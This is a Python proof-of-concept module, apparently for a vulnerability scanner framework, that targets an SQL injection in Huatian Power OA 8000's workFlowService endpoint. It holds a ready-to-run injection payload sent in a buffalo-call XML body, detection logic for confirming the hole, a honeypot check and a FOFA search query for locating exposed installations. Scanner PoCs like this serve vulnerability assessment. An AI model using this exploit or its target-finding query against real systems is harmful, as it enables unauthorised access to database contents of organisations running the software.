# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()

class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "华天动力OA 8000版 workFlowService SQL注入漏洞",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "华天动力OA",  # 漏洞应用名称
        "AppVersion": "华天动力OA 8000版",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。
            睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。
            
            华天动力OA workFlowService 存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="华天动力-OA8000"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/OAapp/bfapp/buffalo/workFlowService"  # url自己按需调整
        data = """
<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>"""

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if "<type>java.util.ArrayList</type>" in req.text and "text/xml" in req.headers[
                "Content-Type"] and req.status_code == 200:
                vuln = [True, req.text]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
